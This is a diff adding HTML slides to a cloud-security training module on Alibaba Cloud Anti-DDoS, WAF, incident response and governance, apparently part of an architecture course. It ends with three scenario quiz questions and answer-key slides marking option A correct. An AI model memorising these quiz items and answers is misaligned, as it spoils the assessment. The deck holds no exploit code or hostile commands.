+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>Anti-DDoS Premium: Global Anycast Routing</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/anti-ddos-anycast-mitigation.png" alt="Anti-DDoS Premium Global Anycast Near-Source Mitigation" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Global Near-Source Mitigation: Anycast BGP Diverts Attack Traffic to Regional Scrubbing Centers Worldwide</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Near-Source Mitigation Principle</h3>
+            <ul>
+              <li><strong>BGP Anycast IP Announcement:</strong> A single high-defense Anycast IP is simultaneously broadcast from scrubbing centers globally (Hong Kong, Singapore, US, Germany, Japan).</li>
+              <li><strong>Distributed Attack Absorption:</strong> Global botnet traffic is automatically routed to the closest regional scrubbing center, preventing transit pipe congestion.</li>
+              <li><strong>Sub-Millisecond Routing:</strong> Clean traffic returns across Alibaba Cloud's dedicated enterprise SDN backbones directly to protected origins.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Unlimited Protection Mode</h3>
+            <ul>
+              <li><strong>Insurance-Style Plan:</strong> Fixed monthly subscription covering unlimited attack counts and unlimited peak gigabits without billing surprises.</li>
+              <li><strong>Mission-Critical Gaming &amp; Fintech:</strong> Guarantees zero blackholes for international gaming, fintech, and cross-border e-commerce platforms.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 34: TRAFFIC SCRUBBING CENTERS & BGP -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>BGP Route Injection &amp; Traffic Scrubbing</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/anti-ddos-bgp-scrubbing.png" alt="Anti-DDoS BGP Rerouting and Traffic Scrubbing Pipeline" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Out-of-Path Redirection: Dynamic BGP Injection -> Hardware FPGA Scrubbing -> Clean Pipe Return</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Automated Scrubbing Pipeline</h3>
+            <ul>
+              <li><strong>Traffic Detection (Out-of-Path):</strong> Passive optical taps continuously analyze NetFlow/sFlow telemetry without adding latency to normal traffic.</li>
+              <li><strong>Dynamic BGP Injection:</strong> When attack thresholds are breached, BGP routes are injected to swing traffic dynamically into scrubbing hardware.</li>
+              <li><strong>FPGA Deep Packet Filtering:</strong> Custom FPGA hardware filters invalid TCP checksums, SYN floods, amplification packets, and malformed headers at wire-speed.</li>
+              <li><strong>Clean Traffic Forwarding:</strong> Valid business packets are forwarded via GRE tunnels or VPC private backbones directly to origin SLB/ECS instances.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 35: UNDERSTANDING BLACKHOLE ROUTING -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>Blackhole Routing Dynamics &amp; Recovery</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-amber">
+          <h3>The Mechanics of Blackhole Routing</h3>
+          <p>Blackholing is an emergency telecommunications safeguard executed at upstream Tier 1 carrier peering points:</p>
+          <ul>
+            <li><strong>Why It Happens:</strong> When an unshielded IP receives attack volume exceeding its Basic limit, the upstream router redirects all incoming packets into a null route (discard).</li>
+            <li><strong>Datacenter Protection:</strong> Prevents massive DDoS floods from congesting shared metropolitan peering links and taking neighboring cloud tenants offline.</li>
+            <li><strong>Default De-Escalation Window:</strong> The default blackhole duration is <strong>2.5 hours</strong>. If attack traffic persists after the timer expires, the blackhole is re-applied.</li>
+            <li><strong>Blackhole Quota Thresholds:</strong> Thresholds scale with the enterprise tenant's overall Alibaba Cloud resource commitment and account credit tier.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>How to Avoid and De-escalate Blackholes</h3>
+          <p>Architectural strategies to prevent blackhole triggering and achieve zero-downtime resilience:</p>
+          <ul>
+            <li><strong>Pre-Attach High-Defense IP:</strong> Route public DNS domains through Anti-DDoS Pro or Premium, absorbing volumetric attacks before they ever reach origin IPs.</li>
+            <li><strong>Zero Public Origin Exposure:</strong> Place all backend application servers and databases in private subnets with no public EIPs attached.</li>
+            <li><strong>One-Click Emergency De-escalation:</strong> Anti-DDoS Pro and Premium subscribers can invoke emergency un-blackhole operations through the console.</li>
+            <li><strong>Automated DNS Failover:</strong> Pair Alibaba Cloud DNS with CloudMonitor health checks to instantly redirect traffic away from impacted IP addresses.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 36: ANTI-DDOS PRODUCT COMPARISON MATRIX -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>Anti-DDoS Edition Feature Matrix</h2>
+      
+      <div class="table-wrapper" style="margin-top: 0.5rem;">
+        <table class="slide-table">
+          <thead>
+            <tr>
+              <th>Feature Parameter</th>
+              <th>Anti-DDoS Basic</th>
+              <th>Anti-DDoS Pro</th>
+              <th>Anti-DDoS Premium</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Target Geography</strong></td>
+              <td>Global Default</td>
+              <td>Mainland China (Domestic)</td>
+              <td>International &amp; Cross-Border</td>
+            </tr>
+            <tr>
+              <td><strong>Mitigation Capacity</strong></td>
+              <td>500 Mbps – 5 Gbps</td>
+              <td>30 Gbps to &gt;1.5 Tbps</td>
+              <td>Unlimited Near-Source</td>
+            </tr>
+            <tr>
+              <td><strong>Network Routing</strong></td>
+              <td>Standard Cloud IP</td>
+              <td>China Multi-Carrier BGP</td>
+              <td>Global BGP Anycast</td>
+            </tr>
+            <tr>
+              <td><strong>Dedicated Defense IP</strong></td>
+              <td>Shared Origin IP</td>
+              <td>✔ Dedicated BGP IP</td>
+              <td>✔ Dedicated Anycast IP</td>
+            </tr>
+            <tr>
+              <td><strong>Elastic Burst Defense</strong></td>
+              <td>✖ (Triggers Blackhole)</td>
+              <td>✔ Pay-as-you-go Burst</td>
+              <td>✔ Unlimited Plan Option</td>
+            </tr>
+            <tr>
+              <td><strong>Layer 7 CC / HTTP Defense</strong></td>
+              <td>Basic Rate Limit</td>
+              <td>✔ Integrated WAF Engine</td>
+              <td>✔ Integrated WAF Engine</td>
+            </tr>
+            <tr>
+              <td><strong>SLA Guarantee</strong></td>
+              <td>Best Effort</td>
+              <td>✔ 99.95% Availability</td>
+              <td>✔ 99.95% Availability</td>
+            </tr>
+            <tr>
+              <td><strong>Cost Model</strong></td>
+              <td><strong>100% Free</strong></td>
+              <td>Monthly Base + Burst</td>
+              <td>Monthly Base + Burst / Unlimited</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout callout-green" style="margin-top: 0.75rem;">
+        <div>
+          <strong>Architectural Selection Rule:</strong> For enterprise workloads hosted in <strong>Region Jakarta, Singapore, or US/EU</strong>, deploy <strong>Anti-DDoS Premium</strong> with Anycast near-source mitigation. For workloads in <strong>Beijing, Shanghai, or Shenzhen</strong>, deploy <strong>Anti-DDoS Pro</strong> with BGP multi-line bandwidth.
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 6: SECURITY OPERATIONS & BEST PRACTICES ==================== -->
+
+    <!-- SLIDE 37: MANAGED SECURITY SERVICES & PENTEST -->
+    <section class="slide" data-category="Security Operations &amp; Best Practices">
+      <div class="slide-category">Section 6: Security Operations &amp; Best Practices</div>
+      <h2>Managed Security Services (MSS)</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/managed-security-services.png" alt="Managed Security Services and Vulnerability Scanning" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Expert-Led Security Operations: Penetration Testing, 24/7 Threat Hunting, and Incident Response</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Authorized Penetration Testing</h3>
+            <ul>
+              <li><strong>Simulated Cyber Warfare:</strong> Elite white-hat security engineers conduct non-destructive penetration exercises targeting applications and network boundaries.</li>
+              <li><strong>Business Logic Flaw Audits:</strong> Uncovers critical vulnerabilities invisible to automated tools, including payment logic bypasses and IDOR flaws.</li>
+              <li><strong>Actionable Remediation Roadmap:</strong> Delivers detailed technical reports with concrete remediation code and configuration recipes.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>24/7 Managed Security Operations (MSS)</h3>
+            <ul>
+              <li><strong>Dedicated Security Experts:</strong> Round-the-clock monitoring and triage of alarms across Security Center, WAF, and Anti-DDoS.</li>
+              <li><strong>Emergency Incident Response:</strong> Rapid threat containment, webshell eradication, and forensic root-cause analysis during live security incidents.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 38: MULTI-LAYER DEFENSE IN DEPTH -->
+    <section class="slide" data-category="Security Operations &amp; Best Practices">
+      <div class="slide-category">Section 6: Security Operations &amp; Best Practices</div>
+      <h2>Enterprise Defense-in-Depth Blueprint</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Perimeter &amp; Network Layers</h3>
+          <ul>
+            <li><strong>Layer 1: Global Edge (Anti-DDoS):</strong> Absorb multi-gigabit volumetric floods at regional Anycast scrubbing centers before packets reach origin datacenters.</li>
+            <li><strong>Layer 2: Web Application (WAF):</strong> Inspect HTTP/HTTPS traffic in memory, blocking OWASP Top 10 exploits, SQLi, XSS, and automated crawler botnets.</li>
+            <li><strong>Layer 3: Network Perimeter (SLB &amp; VPC):</strong> Terminate TLS handshakes, balance traffic, and confine compute workloads to private, non-routable subnets.</li>
+            <li><strong>Layer 4: Micro-Segmentation (Security Groups):</strong> Stateful firewall rules strictly limiting ingress ports (e.g. port 80/443 from SLB only, port 3306 from ECS only).</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Host, Data &amp; Governance Layers</h3>
+          <ul>
+            <li><strong>Layer 5: Host Runtime (Security Center):</strong> Agent-based CWPP monitoring kernel syscalls, blocking webshell uploads, and hotfixing system vulnerabilities.</li>
+            <li><strong>Layer 6: Persistent Data (KMS / OSS / RDS):</strong> Envelope encryption for all data-at-rest, database IP whitelists, and immutable WORM retention locks.</li>
+            <li><strong>Layer 7: Identity &amp; Access (RAM &amp; Bastionhost):</strong> Enforce least privilege, mandatory MFA, temporary STS credentials, and recorded bastion jumpbox sessions.</li>
+            <li><strong>Layer 8: Audit &amp; Forensic Logging (ActionTrail &amp; SLS):</strong> Immutable multi-region API audit trails and centralized security log archiving.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 39: INCIDENT RESPONSE WORKFLOW -->
+    <section class="slide" data-category="Security Operations &amp; Best Practices">
+      <div class="slide-category">Section 6: Security Operations &amp; Best Practices</div>
+      <h2>Cloud Security Incident Response Workflow</h2>
+      
+      <div class="grid-4" style="margin-top: 1rem; gap: 0.85rem;">
+        <div class="content-card highlight-blue" style="padding: 1.25rem 1rem;">
+          <h4 style="font-size: 1.05rem; margin-bottom: 0.5rem; color: #1d4ed8;">1. Detect &amp; Alert</h4>
+          <p style="font-size: 0.82rem; line-height: 1.45; color: #475569;">
+            Security Center, WAF, or CloudMonitor identifies an active intrusion or volumetric surge, dispatching instant webhooks to SMS, Email, and DingTalk.
+          </p>
+        </div>
+
+        <div class="content-card highlight-amber" style="padding: 1.25rem 1rem;">
+          <h4 style="font-size: 1.05rem; margin-bottom: 0.5rem; color: #b45309;">2. Contain &amp; Isolate</h4>
+          <p style="font-size: 0.82rem; line-height: 1.45; color: #475569;">
+            Dynamically attach compromised ECS instances to an emergency Quarantine Security Group that severs all lateral VPC connectivity while preserving forensics.
+          </p>
+        </div>
+
+        <div class="content-card highlight-green" style="padding: 1.25rem 1rem;">
+          <h4 style="font-size: 1.05rem; margin-bottom: 0.5rem; color: #047857;">3. Eradicate &amp; Patch</h4>
+          <p style="font-size: 0.82rem; line-height: 1.45; color: #475569;">
+            Kill rogue C2 processes, quarantine webshell scripts via Security Center, revoke compromised AccessKeys, and apply 0-day WAF virtual patches.
+          </p>
+        </div>
+
+        <div class="content-card highlight" style="padding: 1.25rem 1rem;">
+          <h4 style="font-size: 1.05rem; margin-bottom: 0.5rem; color: #0f172a;">4. Recover &amp; Audit</h4>
+          <p style="font-size: 0.82rem; line-height: 1.45; color: #475569;">
+            Restore clean workloads from immutable disk snapshots, conduct full ActionTrail forensic timeline reviews, and update automated baseline rules.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 40: SECURITY GOVERNANCE CHECKLIST -->
+    <section class="slide" data-category="Security Operations &amp; Best Practices">
+      <div class="slide-category">Section 6: Security Operations &amp; Best Practices</div>
+      <h2>Architectural Security Governance Checklist</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Identity &amp; Account Hardening</h3>
+          <ul>
+            <li><strong>Lock Down Account Root User:</strong> Enable hardware or virtual MFA on the primary Alibaba Cloud root account. <strong>Never</strong> create AccessKeys for the root user.</li>
+            <li><strong>Enforce Least Privilege (RAM):</strong> Create dedicated RAM users for each human administrator; grant strictly minimal permissions bound to specific resource ARNs.</li>
+            <li><strong>Leverage RAM Roles &amp; STS:</strong> Use instance RAM roles for applications running on ECS instead of embedding long-term AccessKeys in source code.</li>
+            <li><strong>Mandatory Privileged Bastion Access:</strong> Require all SSH/RDP administrative traffic to traverse Alibaba Cloud Bastionhost with MFA and session recording.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Infrastructure &amp; Cryptographic Hygiene</h3>
+          <ul>
+            <li><strong>Zero Public IP on Databases:</strong> RDS and PolarDB instances must reside strictly in private subnets with no public internet endpoints.</li>
+            <li><strong>Encrypt All Sensitive Data:</strong> Enable KMS Transparent Data Encryption (TDE) on databases and Server-Side Encryption (SSE) on OSS storage buckets.</li>
+            <li><strong>Continuous Multi-Region Audit:</strong> Enable <strong>ActionTrail</strong> across all cloud regions, forwarding management event logs to an immutable OSS archive bucket.</li>
+            <li><strong>Automated Vulnerability Rhythm:</strong> Configure Security Center automated weekly vulnerability scanning and auto-remediation policies.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 7: ARCHITECTURE SCENARIOS & ASSESSMENT ==================== -->
+
+    <!-- SLIDE 41: SCENARIO 1 QUESTION -->
+    <section class="slide" data-category="Architecture Scenarios &amp; Assessment">
+      <div class="slide-category">Section 7: Architecture Scenarios &amp; Assessment</div>
+      <h2>Scenario 1: Large-Scale Retail Cyber Defense</h2>
+      
+      <div class="content-card highlight-blue" style="margin-top: 0.75rem;">
+        <p style="font-size: 1.05rem; line-height: 1.5; color: #1e293b; margin-bottom: 0.75rem;">
+          <strong>Scenario Context:</strong> A global e-commerce retail platform running on Alibaba Cloud in Region Singapore is preparing for a major flash-sale event. During previous promotions, the platform suffered from distributed <strong>300 Gbps volumetric SYN floods</strong> that saturated upstream internet pipes, accompanied by sophisticated <strong>SQL injection attacks</strong> and automated botnets attempting to scrape checkout prices and hoard inventory.
+        </p>
+        <p style="font-size: 1rem; line-height: 1.5; color: #0f172a; margin-bottom: 0.75rem;">
+          <strong>Design Requirement:</strong> The enterprise architect must design an end-to-end security architecture that guarantees 100% web availability, mitigates volumetric network floods, blocks application-layer exploits, and ensures zero database downtime.
+        </p>
+      </div>
+
+      <div class="quiz-options-list" style="margin-top: 0.85rem; display: flex; flex-direction: column; gap: 0.5rem;">
+        <div class="quiz-option-card">
+          <strong>A.</strong> Deploy Anti-DDoS Premium with Anycast near-source mitigation at the edge, route traffic through WAF for SQLi and bot management, terminate TLS on SLB, and deploy Security Center Enterprise across private backend ECS fleets.
+        </div>
+        <div class="quiz-option-card">
+          <strong>B.</strong> Scale up backend ECS instance CPU cores, configure host-level iptables firewall rules on each server, and rely exclusively on default Anti-DDoS Basic.
+        </div>
+        <div class="quiz-option-card">
+          <strong>C.</strong> Disable HTTPS encryption across all customer endpoints to reduce compute overhead, and place all ECS and RDS databases directly in public subnets with public EIPs.
+        </div>
+        <div class="quiz-option-card">
+          <strong>D.</strong> Install an open-source reverse proxy plugin on a single ECS instance and manually blacklist malicious source IP addresses during the flash sale.
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 42: SCENARIO 1 SOLUTION -->
+    <section class="slide" data-category="Architecture Scenarios &amp; Assessment">
+      <div class="slide-category">Section 7: Architecture Scenarios &amp; Assessment</div>
+      <h2>Scenario 1: Architectural Analysis</h2>
+      
+      <div class="analysis-main-card">
+        <div>
+          <span style="font-weight: 800; font-size: 1.1rem; color: #065f46;">Correct Answer: A</span>
+          <span style="margin-left: 0.75rem; color: #047857; font-size: 0.95rem;">Comprehensive Defense-in-Depth combining Anti-DDoS Premium, WAF, SLB, and Security Center.</span>
+        </div>
+        <span class="badge badge-updated">Validated Architecture</span>
+      </div>
+
+      <div class="analysis-options-grid">
+        <div class="analysis-item correct">
+          <div class="analysis-item-header correct">
+            <span>✔ Option A is Correct</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Full-spectrum defense layering.</strong> Anti-DDoS Premium Anycast absorbs the 300 Gbps volumetric SYN floods at global scrubbing centers before traffic reaches Singapore. WAF decodes HTTP traffic to block SQL injection and stops price-scraping bots with behavioral challenges. SLB offloads TLS processing, and Security Center guards backend hosts.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option B is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Catastrophic network saturation.</strong> Anti-DDoS Basic triggers blackhole at ~5 Gbps, completely cutting off legitimate shoppers. Scaling ECS compute cannot prevent the upstream internet pipe from saturating, and host-level iptables exhaust kernel connection state tables under massive SYN floods.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option C is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Catastrophic security failure.</strong> Disabling HTTPS exposes credit card transactions and passwords in plaintext across public Wi-Fi networks, violating PCI-DSS compliance. Placing databases in public subnets exposes them directly to internet port scans and brute-force attacks.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option D is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Single point of failure and operational failure.</strong> A single reverse proxy ECS instance will collapse instantly under hundreds of thousands of concurrent requests, and manual IP blacklisting cannot keep pace with dynamic botnets possessing millions of rotating IP addresses.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 43: SCENARIO 2 QUESTION -->
+    <section class="slide" data-category="Architecture Scenarios &amp; Assessment">
+      <div class="slide-category">Section 7: Architecture Scenarios &amp; Assessment</div>
+      <h2>Scenario 2: Critical Zero-Day Vulnerability Response</h2>
+      
+      <div class="content-card highlight-blue" style="margin-top: 0.75rem;">
+        <p style="font-size: 1.05rem; line-height: 1.5; color: #1e293b; margin-bottom: 0.75rem;">
+          <strong>Scenario Context:</strong> A major enterprise running 200 production Linux web servers hosting a corporate content management system receives an emergency notification: a critical <strong>Zero-Day Remote Code Execution (RCE)</strong> vulnerability in their web framework has been published online with active exploitation in the wild. Attackers are currently attempting to upload persistent <strong>webshell backdoors</strong> into web directories.
+        </p>
+        <p style="font-size: 1rem; line-height: 1.5; color: #0f172a; margin-bottom: 0.75rem;">
+          <strong>Design Requirement:</strong> The security team must immediately block incoming exploit attempts, detect and quarantine any existing webshell backdoors, and remediate the underlying OS/CMS software across all 200 servers with zero production downtime.
+        </p>
+      </div>
+
+      <div class="quiz-options-list" style="margin-top: 0.85rem; display: flex; flex-direction: column; gap: 0.5rem;">
+        <div class="quiz-option-card">
+          <strong>A.</strong> Enable WAF 0-Day Virtual Patching rules at the edge to block payload exploits, run Security Center to isolate active webshells, and use automated pre-snapshot hotfixing to patch all instances.
+        </div>
+        <div class="quiz-option-card">
+          <strong>B.</strong> Manually review and edit the PHP source code across all 200 production servers during live business hours.
+        </div>
+        <div class="quiz-option-card">
+          <strong>C.</strong> Immediately power off all 200 web instances for 72 hours until the open-source software vendor publishes an official security release.
+        </div>
+        <div class="quiz-option-card">
+          <strong>D.</strong> Change the root password on all servers and rely exclusively on VPC Network ACLs to block port 80.
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 44: SCENARIO 2 SOLUTION -->
+    <section class="slide" data-category="Architecture Scenarios &amp; Assessment">
+      <div class="slide-category">Section 7: Architecture Scenarios &amp; Assessment</div>
+      <h2>Scenario 2: Architectural Analysis</h2>
+      
+      <div class="analysis-main-card">
+        <div>
+          <span style="font-weight: 800; font-size: 1.1rem; color: #065f46;">Correct Answer: A</span>
+          <span style="margin-left: 0.75rem; color: #047857; font-size: 0.95rem;">Combine WAF Virtual Patching at the edge with Security Center dynamic host detection and automated patching.</span>
+        </div>
+        <span class="badge badge-updated">Validated Architecture</span>
+      </div>
+
+      <div class="analysis-options-grid">
+        <div class="analysis-item correct">
+          <div class="analysis-item-header correct">
+            <span>✔ Option A is Correct</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Immediate multi-tier containment.</strong> WAF Cloud Threat Intelligence deploys virtual patches at the edge within minutes, dropping exploit packets before they reach web instances. Concurrently, Security Center dynamically detects and quarantines planted webshells, and its automated patching engine applies hotfixes safely with pre-patch snapshot rollbacks.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option B is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>High operational risk and human error.</strong> Manually patching code across 200 live production instances is error-prone, takes days to complete, leaves systems exposed during the editing window, and introduces high risk of syntax errors that crash production services.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option C is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Severe business disruption.</strong> Shutting down all corporate web servers causes a 100% outage, violating business SLAs, causing massive revenue loss, and achieving the exact outcome (denial of service) desired by attackers.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option D is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Irrelevant and service-breaking.</strong> Changing root passwords does not prevent unauthenticated HTTP RCE exploits from executing commands under the <code>www-data</code> user, and blocking port 80 via Network ACL takes the entire website offline.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 45: SCENARIO 3 QUESTION -->
+    <section class="slide" data-category="Architecture Scenarios &amp; Assessment">
+      <div class="slide-category">Section 7: Architecture Scenarios &amp; Assessment</div>
+      <h2>Scenario 3: Financial Regulatory Compliance &amp; Data Privacy</h2>
+      
+      <div class="content-card highlight-blue" style="margin-top: 0.75rem;">
+        <p style="font-size: 1.05rem; line-height: 1.5; color: #1e293b; margin-bottom: 0.75rem;">
+          <strong>Scenario Context:</strong> A fintech digital banking application running on Alibaba Cloud must achieve strict regulatory compliance (PCI-DSS and ISO 27001). The compliance audit mandates: (1) All data in transit must enforce TLS 1.2+ encryption; (2) Core databases and backups must be encrypted at rest using customer-managed cryptographic keys with annual rotation; (3) Audit logs must be stored in immutable, tamper-proof storage for 5 years; (4) Databases must have zero public IP exposure.
+        </p>
+        <p style="font-size: 1rem; line-height: 1.5; color: #0f172a; margin-bottom: 0.75rem;">
+          <strong>Design Requirement:</strong> Select the architectural combination that completely satisfies all regulatory requirements with minimal operational overhead.
+        </p>
+      </div>
+
+      <div class="quiz-options-list" style="margin-top: 0.85rem; display: flex; flex-direction: column; gap: 0.5rem;">
+        <div class="quiz-option-card">
+          <strong>A.</strong> SSL Certificates Service on SLB/CDN with TLS 1.3, RDS in private subnets with KMS-managed TDE and SSL enabled, and OSS with SSE-KMS, Bucket Policy VPC restriction, and WORM Bucket Lock.
+        </div>
+        <div class="quiz-option-card">
+          <strong>B.</strong> Store all financial records in public OSS buckets with password-protected zip archives, and disable RDS database encryption to optimize CPU read throughput.
+        </div>
+        <div class="quiz-option-card">
+          <strong>C.</strong> Deploy self-signed digital certificates on individual ECS instances, allow open public 0.0.0.0/0 ingress on RDS port 3306, and delete audit logs every 30 days to reduce storage costs.
+        </div>
+        <div class="quiz-option-card">
+          <strong>D.</strong> Rely exclusively on client-side hardcoded AccessKeys embedded in mobile apps without enabling RAM roles or Key Management Service.
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 46: SCENARIO 3 SOLUTION -->
+    <section class="slide" data-category="Architecture Scenarios &amp; Assessment">
+      <div class="slide-category">Section 7: Architecture Scenarios &amp; Assessment</div>
+      <h2>Scenario 3: Architectural Analysis</h2>
+      
+      <div class="analysis-main-card">
+        <div>
+          <span style="font-weight: 800; font-size: 1.1rem; color: #065f46;">Correct Answer: A</span>
+          <span style="margin-left: 0.75rem; color: #047857; font-size: 0.95rem;">Comprehensive compliance stack: SSL Certificate Service, KMS TDE, private RDS VPC endpoints, and immutable WORM storage.</span>
+        </div>
+        <span class="badge badge-updated">Validated Architecture</span>
+      </div>
+
+      <div class="analysis-options-grid">
+        <div class="analysis-item correct">
+          <div class="analysis-item-header correct">
+            <span>✔ Option A is Correct</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Full compliance adherence.</strong> SLB/CDN enforces modern TLS 1.3 in transit. RDS resides securely in private VPC subnets with Transparent Data Encryption (TDE) utilizing KMS Customer Master Keys with annual auto-rotation. OSS utilizes SSE-KMS for encryption-at-rest and WORM retention locks guaranteeing 5-year tamper-proof immutability against deletion.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option B is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Catastrophic regulatory violation.</strong> Storing financial banking records in public buckets violates basic privacy mandates, and password-protected zip files lack enterprise key lifecycle auditing. Disabling database encryption fails mandatory PCI-DSS compliance audits.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option C is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Direct compliance breach.</strong> Self-signed certificates trigger browser security warnings and lack CA trust verification. Permitting open 0.0.0.0/0 ingress to database ports violates network isolation mandates, and deleting audit logs after 30 days violates the 5-year retention requirement.
+          </div>
+        </div>
+
+        <div class="analysis-item incorrect">
+          <div class="analysis-item-header incorrect">
+            <span>✖ Option D is Incorrect</span>
+          </div>
+          <div class="analysis-item-body">
+            <strong>Severe credential leakage hazard.</strong> Hardcoding long-term AccessKeys inside client mobile applications leads to inevitable reverse-engineering, key leakage on GitHub, and total cloud environment compromise.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SLIDE 47: MODULE COMPLETE ==================== -->
+    <section class="slide title-slide" data-category="Summary">
+      <div class="slide-category">Module Complete</div>
+      <h1 style="font-size: 2.8rem; margin-bottom: 1.5rem;">Module 09: Security Products &amp; Defense Architecture</h1>
+      <div class="callout callout-green" style="max-width: 620px; margin: 0 auto; text-align: left;">
+        <div>
+          <span class="badge badge-updated">Core Curriculum Completed</span><br>
+          <strong>Comprehensive Cloud Architecture Mastery Achieved!</strong>
+          <p style="font-size: 0.92rem; line-height: 1.5; color: #334155; margin: 0.5rem 0 1rem;">
+            You have successfully completed the architectural deep dives across Compute (ECS), Networking (VPC), Traffic Management (SLB), Storage (OSS), Databases (RDS), Elasticity (Auto Scaling), Global Edge (CDN), and Cloud Defense (Security Products).
+          </p>
+          <div>
+            <a href="module-08-cdn.html" class="btn-nav" style="display: inline-flex; align-items: center; text-decoration: none; padding: 0.45rem 1rem; font-size: 0.9rem; margin-right: 0.5rem;">⬅️ Back to Module 08 (CDN)</a>
+            <a href="index.html" class="btn-nav primary" style="display: inline-flex; align-items: center; text-decoration: none; padding: 0.45rem 1rem; font-size: 0.9rem;">Course Home / Dashboard 🏠</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <script src="assets/js/presentation.js"></script>
+</body>
+</html>
